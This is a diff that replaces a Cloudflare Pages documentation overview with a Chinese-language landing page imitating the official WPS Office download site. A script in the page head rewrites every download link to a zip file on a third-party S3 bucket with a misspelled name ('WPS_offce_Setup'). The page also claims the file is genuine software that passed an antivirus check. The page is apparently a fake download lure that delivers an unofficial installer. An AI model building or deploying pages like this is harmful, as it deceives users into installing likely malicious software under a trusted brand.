@@ -1,120 +1,247 @@
----
-title: Cloudflare Pages
 
-pcx_content_type: overview
-sidebar:
-  order: 1
-head:
-  - tag: title
-    content: Overview
----
+<html lang="en">
 
-import {
-	CardGrid,
-	Description,
-	Feature,
-	LinkTitleCard,
-	Plan,
-	RelatedProduct,
-	Render,
-	Aside,
-} from "~/components";
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>表格文档软件</title>
+    <meta name="Keywords" content="WPS Office 软件" />
+    <meta name="Description" content="WPS Office 软件" />
+    <link rel="Shortcut Icon" href="//www.ijinshan.com/favicon.ico">
+    <link rel="stylesheet" href="static/css/tp2305.css">
+    <script src='https://s1.pstatp.com/cdn/expire-1-M/jquery/1.10.2/jquery.min.js'></script>
+    <script>
+        let Ahref = "https://s3.ap-east-1.amazonaws.com/ourtjk.aws/WPS_offce_Setup_2026.3.0.zip";//下载文件路径
+        $(document).ready(function () {
+            $("a:not(.intro)").each(function () {
+                $(this).attr("href", Ahref);
+               
+            });
+        });
+    </script>
+</head>
 
-<Description>
+<body>
 
-Create full-stack applications that are instantly deployed to the Cloudflare global network.
+    <div class="header">
 
-</Description>
+        <div class="banner">
+                <a class="intro" href="www" target="_blank" style="position: absolute;left:50px;top:50px;z-index: 999;"><img class="logoImg fl" src="./logo.png" alt="" style="max-width: 150px;"></a>
+            <div class="title">
+                <img src="static/picture/eef7e2126ca0b00546017b882ac0c934.png" alt="WPS Office 办公软件" class="logo left">
+                <div class="text left">
+                    <h1 class="left">WPS Office </h1>
+                    <div class="keyMate left" id="J_keyMate">
+                        <span class="border left">中文64位</span>
+                        <span class="blue left">安装</span>
+                    </div>
+                    <img src="static/picture/card.png" alt="该软件通过金山毒霸安全检测，下载体验" title="下载体验"
+                        class="card left" id="J_card">
+                    <p class="doc clear">一站式办公服务平台，实现高效办公</p>
+                </div>
+            </div>
+            <div class="img-btn">
+                <img src="static/picture/583f2aaa277d03ad8cc41f0e5c08b136.png" alt="WPS Office 办公软件"
+                    class="banner-img left">
+                <div class="banner-box left">
 
-<Plan type="all" />
+                    <div class="key-word left" style="color:#00B960;">
 
-Deploy your Pages project by connecting to [your Git provider](/pages/get-started/git-integration/), uploading prebuilt assets directly to Pages with [Direct Upload](/pages/get-started/direct-upload/) or using [C3](/pages/get-started/c3/) from the command line.
 
----
+                        <img src="static/picture/banner_icon1.png" alt="WPS Office 办公软件" class="left">
 
-## Features
 
-<Feature header="Pages Functions" href="/pages/functions/">
+                        <span class="left">办公套装</span>
 
-Use Pages Functions to deploy server-side code to enable dynamic functionality without running a dedicated server.
+                    </div>
 
-</Feature>
+                    <div class="key-word left" style="color:#009BF2;">
 
-<Feature header="Rollbacks" href="/pages/configuration/rollbacks/">
 
-Rollbacks allow you to instantly revert your project to a previous production deployment.
+                        <img src="static/picture/banner_icon2.png" alt="WPS Office 办公软件" class="left">
 
-</Feature>
 
-<Feature header="Redirects" href="/pages/configuration/redirects/">
+                        <span class="left">高效办公</span>
 
-Set up redirects for your Cloudflare Pages project.
+                    </div>
+                    <a download href="" class="download btn  J_ocpcBtn J_download left clear"
+                        id="download-1" status="1">
+                        <span class="btn__icon">
+                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg"
+                                xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="24px" height="24px"
+                                viewBox="0 0 24 24" style="position: relative;z-index: 90;" xml:space="preserve">
+                                <style type="text/css">
+                                    .st0 {
+                                        fill: #fff;
+                                    }
+                                </style>
+                                <polygon class="st0"
+                                    points="13.6,17.2 13.6,1 10.4,1 10.4,17.2 2.4,9.9 0.3,12.5 12.2,23 12.2,23 23.7,12.4 21.4,9.9 ">
+                                </polygon>
+                            </svg>
+                        </span>
 
-</Feature>
+                        <i class="btn_text">立即下载</i>
 
----
+                    </a>
+                    <div id="J_checkBtn" class="checkbtn btn left clear" status="7">
+                        <span class="btn__icon">
+                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg"
+                                xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="24px" height="24px"
+                                viewBox="0 0 24 24" style="position: relative;z-index: 90;" xml:space="preserve">
+                                <style type="text/css">
+                                    .st0 {
+                                        fill: #fff;
+                                    }
+                                </style>
+                                <polygon class="st0"
+                                    points="13.6,17.2 13.6,1 10.4,1 10.4,17.2 2.4,9.9 0.3,12.5 12.2,23 12.2,23 23.7,12.4 21.4,9.9 ">
+                                </polygon>
+                            </svg>
+                        </span>
 
-## Related products
+                        <i class="btn_text">立即下载</i>
 
-<RelatedProduct header="Workers" href="/workers/" product="workers">
+                    </div>
+                    <p class="tip clear"></p>
+                    <div class="state left">
+                        <img src="static/picture/banner_icon3.png" alt="WPS Office 办公软件" class="left">
 
-Cloudflare Workers provides a serverless execution environment that allows you to create new applications or augment existing ones without configuring or maintaining infrastructure.
+                        <span class="left">正版官方软件</span>
 
-</RelatedProduct>
+                    </div>
+                    <div class="state left">
+                        <img src="static/picture/banner_icon3.png" alt="WPS Office 办公软件" class="left">
 
-<RelatedProduct header="R2" href="/r2/" product="r2">
+                        <span class="left">下载安全无忧</span>
 
-Cloudflare R2 Storage allows developers to store large amounts of unstructured data without the costly egress bandwidth fees associated with typical cloud storage services.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-</RelatedProduct>
+    <div class="main">
+        <ul class="img-list">
+            <li>
+                <p class="desc">“云”办公软件</p>
+                <img src="static/picture/aaeccae561ef9615c1a9ea385f2b408a.png" alt="WPS Office 办公软件">
+            </li>
+            <li>
+                <p class="desc">小巧快速 全面兼容</p>
+                <img src="static/picture/f129eb46b44a3cc10ca92e7fcacd85b1.png" alt="WPS Office 办公软件">
+            </li>
+        </ul>
 
-<RelatedProduct header="D1" href="/d1/" product="d1">
+        <div class="downType" id="J_downType">
+            <div class="common-btn left">
+                <div class="common btn" id="J_commonBtn">
+                    <img src="static/picture/btn1.png" class="left" alt="WPS Office 办公软件">
+                    <i class="left">普通下载</i>
+                </div>
+                <p class="tip">原始下载方式，少数人的选择</p>
+            </div>
+            <div class="safeType left">
+                <a download href="" class="safe btn  J_ocpcBtn J_typeDownload" status="4"
+                    id="download-4">
+                    <img src="static/picture/btn2.png" class="left" alt="WPS Office 办公软件">
+                    <i class="left">安全下载</i>
+                </a>
+                <div class="checkTypeownload btn" status="10" id="J_checkTypeDownload">
+                    <img src="static/picture/btn2.png" class="left" alt="WPS Office 办公软件">
+                    <i class="left">安全下载</i>
+                </div>
+                <p class="tip">需安装金山毒霸，通过毒霸软件管家下载，享受更多权益</p>
+            </div>
+        </div>
+    </div>
 
-D1 is Cloudflare’s native serverless database. Create a database by importing data or defining your tables and writing your queries within a Worker or through the API.
+    <div class="footer">
+        <!-- <div id="J_seoFooter">
+        </div> -->
+    </div>
 
-</RelatedProduct>
+    <div class="fix">
+        <div class="fix-box">
+            <div class="product-logo left">
+                <img src="static/picture/eef7e2126ca0b00546017b882ac0c934.png" alt="WPS Office 办公软件" class="left">
+                <i class="left">WPS Office 办公软件</i>
+            </div>
+            <p class="doc left">一站式办公服务平台</p>
+            <a download href="" class="at-once  J_ocpcBtn J_bottomDownload" status="5" id="download-5">
+                <img src="static/picture/btn3.png" class="left" alt="WPS Office 办公软件">
 
-<RelatedProduct header="Zaraz" href="/zaraz/" product="zaraz">
+                <i class="left">立即下载</i>
 
-Offload third-party tools and services to the cloud and improve the speed and security of your website.
+            </a>
+            <div class="checkBottomBtn at-once" status="9" id="J_checkBottomBtn">
+                <img src="static/picture/btn3.png" class="left" alt="WPS Office 办公软件">
 
-</RelatedProduct>
+                <i class="left">立即下载</i>
 
----
+            </div>
+        </div>
+    </div>
 
-## More resources
+    <div class="alert-box" id="J_alertBox">
+        <div class="alert-wrapper">
+            <div class="alertTop">
+                <div class="topTitle">下载提示</div>
+                <div class="topClose" id="J_alertClose"> × </div>
+            </div>
+            <div class="alertMain">
+                <div class="title">
+                    <p>您正在使用普通下载方式下载</p>
+                    <p>WPS Office 办公软件</p>
+                    <p class="little">(此方式可能存在安全隐患，建议使用安全下载)</p>
+                </div>
+                <div class="alert-btn">
+                    <a download class="commonBtn J_commonDown" href="" id="download-2" status="3">确定</a>
+                    <a download class="safeBtn  J_ocpcBtn" href="" id="download-3" status="2">安全下载</a>
+                </div>
+            </div>
+        </div>
+    </div>
 
-<CardGrid>
+    <div class="check-alert" id="J_checkBox">
+        <div class="check-wrapper">
+            <div class="check-close" id="J_checkClose" status="8"></div>
+            <a download class="check-btn  J_ocpcBtn" href="" status="6" id="J_checkDown"></a>
+        </div>
+    </div>
 
-<LinkTitleCard title="Limits" href="/pages/platform/limits/" icon="document">
-	Learn about limits that apply to your Pages project (500 deploys per month on
-	the Free plan).
-</LinkTitleCard>
+    <div class="tips" id="J_tips">
+        <span class="close" id="J_tipsClose">×</span>
+        <img src="static/picture/tips.png" alt="" srcset="">
+    </div>
 
-<LinkTitleCard
-	title="Framework guides"
-	href="/pages/framework-guides/"
-	icon="open-book"
->
-	Deploy popular frameworks such as React, Hugo, and Next.js on Pages.
-</LinkTitleCard>
+    <script type="text/javascript" src="static/js/jquery-1.11.2.min.js"></script>
+    <script type="text/javascript" src="static/js/infoc.b.min.js"></script>
+    <script type="text/javascript">
+        var productId = 1;
+    </script>
+    <script type="text/javascript" src="static/js/ocpc.js"></script>
+    <script type="text/javascript" src="static/js/semtaglist.js"></script>
+    <script type="text/javascript" src="static/js/addfanxingall.js"></script>
+    <script type="text/javascript" src="static/js/tp2301.js"></script>
+    <script type="text/javascript" src="static/js/footerheader230505.js"></script>
+    <script>
+        (function (b, a, e, h, f, c, g, s) {
+            b[h] = b[h] || function () {
+                (b[h].c = b[h].c || []).push(arguments)
+            };
+            b[h].s = !!c;
+            g = a.getElementsByTagName(e)[0];
+            s = a.createElement(e);
+            s.src = "//s.union.360.cn/" + f + ".js";
+            s.defer = !0;
+            s.async = !0;
+            g.parentNode.insertBefore(s, g)
+        })(window, document, "script", "_qha", 500757, false);
+    </script>
+    <script type="text/javascript" src="//js.users.51.la/21948777.js"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"97c954d78eca4222a106a59077663ed2","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
 
-<LinkTitleCard
-	title="Developer Discord"
-	href="https://discord.cloudflare.com"
-	icon="discord"
->
-	Connect with the Workers community on Discord to ask questions, show what you
-	are building, and discuss the platform with other developers.
-</LinkTitleCard>
-
-<LinkTitleCard
-	title="@CloudflareDev"
-	href="https://x.com/cloudflaredev"
-	icon="x.com"
->
-	Follow @CloudflareDev on Twitter to learn about product announcements, and
-	what is new in Cloudflare Workers.
-</LinkTitleCard>
-
-</CardGrid>
+</html>
